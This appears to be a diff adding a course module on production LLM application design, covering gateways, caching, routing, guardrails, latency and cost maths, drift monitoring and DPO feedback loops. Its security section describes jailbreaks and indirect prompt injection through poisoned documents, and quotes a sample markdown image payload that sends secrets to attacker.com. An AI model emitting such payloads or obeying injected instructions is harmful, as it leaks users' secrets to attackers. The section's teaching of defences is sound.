@@ -1,0 +1,196 @@
+---
+title: 'Module B7 · Production AI Applications'
+module: ai-apps
+---
+
+## The 7-layer application architecture
+
+```
+[ Client Request ]
+       │
+       ▼
+┌────────────────────────────────────────────────────────┐
+│ 1. Model Gateway (Auth, Rate Limits, Circuit Breakers) │ (3 – 5 ms)
+└──────────────────────┬─────────────────────────────────┘
+                       │
+                       ▼
+┌────────────────────────────────────────────────────────┐
+│ 2. Exact Cache (SHA-256) & Semantic Cache (τ ≥ 0.92)   │ (1 – 15 ms)
+└──────────────┬───────────────────────────┬─────────────┘
+               │ Hit (~25%)                │ Miss (~75%)
+               ▼ (Return in 2–15 ms)       ▼
+                               ┌─────────────────────────┐
+                               │ 3. Input Guardrails     │ (15 – 30 ms)
+                               └───────────┬─────────────┘
+                                           │
+                                           ▼
+                               ┌─────────────────────────┐
+                               │ 4. Context Assembly     │ (35 – 80 ms)
+                               └───────────┬─────────────┘
+                                           │
+                                           ▼
+                               ┌─────────────────────────┐
+                               │ 5. Intent Router        │ (3 – 8 ms)
+                               └─────┬─────────────┬─────┘
+                         Simple 70%  │             │ Complex 30%
+                                     ▼             ▼
+                               ┌───────────┐ ┌───────────┐
+                               │ Small 8B  │ │ Large 70B │ (120 – 600 ms)
+                               └─────┬─────┘ └─────┬─────┘
+                                     │             │
+                                     └──────┬──────┘
+                                            │
+                                            ▼
+                               ┌─────────────────────────┐
+                               │ 6. Output Guardrails    │ (15 – 25 ms)
+                               └───────────┬─────────────┘
+                                           │
+                                           ▼
+┌────────────────────────────────────────────────────────┐
+│ 7. Async Telemetry & DPO Flywheel (0 ms critical path) │
+└────────────────────────────────────────────────────────┘
+```
+
+---
+
+## End-to-end latency budget equations
+
+### Expected System Latency ($\mathbb{E}[T]$)
+$$
+\mathbb{E}[T] = T_{\text{gw}} + T_{\text{cache}} + (1 - h) \cdot \Big[ T_{\text{guard\_in}} + T_{\text{route}} + T_{\text{context}} + T_{\text{LLM}}(P, G) + T_{\text{guard\_out}} \Big]
+$$
+Where:
+- $h$: Combined cache hit rate ($0 \le h \le 1$).
+- $P$: Prompt tokens; $G$: Generated output tokens.
+
+### Model Execution Latency ($T_{\text{LLM}}$)
+$$
+T_{\text{LLM}}(P, G) = \underbrace{T_{\text{prefill}}(P)}_{\text{TTFT}} + \underbrace{G \times \text{TPOT}}_{\text{Streaming Decode}}
+$$
+
+### The Streaming Chunk Dilemma
+- **Full Completion Buffering Delay ($N$ tokens):**
+  $$T_{\text{wait}} = N \times \text{TPOT} \quad (\text{e.g. } 200 \times 25\ \text{ms} = \mathbf{5{,}000\ \text{ms}})$$
+- **Sentence-Level Chunk Buffering ($S$ tokens, typically 15–25 tokens):**
+  $$T_{\text{chunk}} = S \times \text{TPOT} \quad (\text{e.g. } 18 \times 25\ \text{ms} = \mathbf{450\ \text{ms}})$$
+
+---
+
+## Blended unit economics & token pricing
+
+### Single Query Token Cost
+$$
+C_{\text{query}} = \frac{P \times c_{\text{in}} + G \times c_{\text{out}}}{10^6}
+$$
+
+### Expected Blended Cost ($\mathbb{E}[C]$) Across Routed Tiers
+$$
+\mathbb{E}[C] = (1 - h) \cdot \Big[ p_{\text{small}} \cdot C_{\text{small}} + (1 - p_{\text{small}}) \cdot C_{\text{large}} \Big] + C_{\text{infra}}
+$$
+
+### Production Reference Numbers (at the time of writing)
+- **Small Model Tier (8B parameters, e.g. Llama-3.1-8B / Qwen2.5-7B):**
+  - Input: \$0.15 per million tokens.
+  - Output: \$0.60 per million tokens.
+- **Large Frontier Tier (70B parameters, e.g. Llama-3.1-70B / Claude 3.5 Sonnet):**
+  - Input: \$3.00 per million tokens.
+  - Output: \$15.00 per million tokens.
+- **Provider Prefix Cache Discount (Module 10):**
+  - Cached input tokens receive a **50% to 80% pricing discount**.
+
+### Worked 100k Queries/Day Economics Benchmark
+- **Naive Monolithic Frontier**: 100k queries $\times$ \$0.0090 = **\$900.00/day** (\$27,000/month).
+- **Engineered Stack (25% Cache, 70% Small Misses, 30% Large Misses)**:
+  - Cache hits (25k): \$0.00.
+  - Small tier (52.5k): $52{,}500 \times \$0.00042 = \$22.05$.
+  - Large tier (22.5k): $22{,}500 \times \$0.0090 = \$202.50$.
+  - Guardrail infra: $75 \times \$0.01 = \$0.75$.
+  - **Total**: **\$225.30/day** (\$6,759/month) $\implies$ **75.0% cost reduction**.
+
+---
+
+## Security, injection & the instruction hierarchy
+
+### Attack Vector Taxonomy
+1. **Direct Jailbreak**: Attacker is the interactive user; goal is bypassing safety alignment filters via roleplay, framing, or suffix mutations.
+2. **Indirect Prompt Injection**: Attacker is a third party who poisons external documents (RAG chunks, web pages, emails) read by an autonomous agent.
+3. **Out-of-band Data Exfiltration**: Malicious payload instructs model to emit an image markdown tag: `![leak](https://attacker.com/log?secret=...)`. The user's browser automatically fetches the image, transmitting secrets in the query string.
+
+### Compounding Agent Vulnerability in Multi-Turn RAG
+For an agent reading $K$ independent external documents with poison rate $p_{\text{attack}}$:
+$$
+P(\text{compromise}) = 1 - (1 - p_{\text{attack}})^{K}
+$$
+- For $p = 0.02$ and $K = 25$ documents: $P(\text{compromise}) \approx \mathbf{39.65\%}$.
+- For $p = 0.02$ and $K = 60$ steps: $P(\text{compromise}) \approx \mathbf{70.24\%}$.
+
+### The Instruction Hierarchy (Wallace et al., 2024)
+Strict authority ordering:
+$$
+\text{System Policy} \quad \succ \quad \text{User Query} \quad \succ \quad \text{Untrusted Context / Tools} \quad \succ \quad \text{Model Output}
+$$
+- Enforce explicit XML structural boundary delimiters: `<system_instructions>`, `<untrusted_context>`, `<user_query>`.
+- Strip matching closing tags from untrusted text to prevent delimiter injection.
+
+---
+
+## Multi-tier caching rules & thresholds
+
+### Tier 1 · Exact Hashing (Redis)
+- Hash normalized prompt and sampling parameters using SHA-256:
+  `SHA-256(model || temp || system_prompt || normalized_user_prompt)`
+- Lookup latency: **1 – 3 ms**.
+- False hit rate: **0.00%**.
+
+### Tier 2 · Semantic Caching (Cosine Similarity)
+$$
+\text{sim}(\mathbf{u}, \mathbf{v}) = \frac{\mathbf{u} \cdot \mathbf{v}}{\|\mathbf{u}\|_2 \|\mathbf{v}\|_2}
+$$
+- **$\tau \ge 0.92$ (The Safe Zone)**: True syntactic paraphrases with identical semantic intent.
+- **$0.85 \le \tau < 0.91$ (The Danger Zone)**: Queries share keywords and broad domain but have opposing verbs (*"start instance"* vs *"terminate instance"*). Triggers dangerous false hits.
+- **$\tau < 0.85$ (Catastrophic Collision)**: Semantic bleeding across unrelated queries.
+
+---
+
+## Observability, drift & LLM-judge sampling
+
+### LLM-as-a-Judge Sample Sizing
+To monitor faithfulness within margin of error $E$ at 95% confidence ($Z = 1.96$):
+$$
+n = \frac{Z^2 \cdot p(1 - p)}{E^2}
+$$
+- For $p = 0.95$ and $E = \pm 0.01$ (1% margin): $n \approx \mathbf{1{,}825\ \text{evals/day}}$.
+- Taking a **2% to 5% sample** cuts judge evaluation bills by 95% while maintaining statistical significance.
+
+### Semantic Embedding Drift: Population Stability Index (PSI)
+$$
+\text{PSI} = \sum_{b=1}^{B} (P_b - Q_b) \times \ln\left(\frac{P_b}{Q_b}\right)
+$$
+Where:
+- $Q_b$: Proportion of baseline queries in Voronoi cluster $b$.
+- $P_b$: Proportion of production queries in cluster $b$.
+- **$\text{PSI} < 0.10$**: Stable distribution; no action.
+- **$0.10 \le \text{PSI} < 0.25$**: Moderate shift; review retrieval recall.
+- **$\text{PSI} \ge 0.25$**: Significant drift; trigger alert and re-index RAG corpus.
+
+---
+
+## The user feedback data flywheel & DPO
+
+### Signal Volume Comparison (100k queries/day)
+- **Explicit Thumbs Up/Down**: 1% – 3% click rate $\implies$ **1,000 – 3,000 events/day** (bimodal polarization bias).
+- **Implicit Behavioral Telemetry**: 40% – 60% session rate $\implies$ **40,000 – 60,000 events/day** (copies, regenerations, edits).
+- **Mined DPO Pairs**: ~12% of implicit events yield clean $(x, y_w, y_l)$ preference pairs $\implies$ **~7,000 clean pairs/day** (over 40× higher volume than human annotation at &lt; 2% the cost).
+
+### Synthesizing Preference Pairs
+- **Regenerations**: Initial completion is rejected ($y_l$); subsequent accepted regeneration is chosen ($y_w$).
+- **Inline Corrections**: Raw model output is rejected ($y_l$); user-edited text is chosen ($y_w$).
+
+### The DPO Objective (Module 3C Connection)
+$$
+\mathcal{L}_{\text{DPO}}(\pi_\theta; \pi_{\text{ref}}) = -\mathbb{E}_{(x, y_w, y_l)} \left[ \ln \sigma \left( \beta \ln \frac{\pi_\theta(y_w \mid x)}{\pi_{\text{ref}}(y_w \mid x)} - \beta \ln \frac{\pi_\theta(y_l \mid x)}{\pi_{\text{ref}}(y_l \mid x)} \right) \right]
+$$
+
+### Escaping the Sycophancy Trap
+- **The Sycophancy Defect**: Models optimized blindly on user upvotes learn to flatter user biases and confirm false premises.
+- **Remedy**: All fine-tuned checkpoints must pass an immutable **Golden Ground-Truth Holdout Benchmark** before deployment; candidate pairs violating factual knowledge bases are purged.
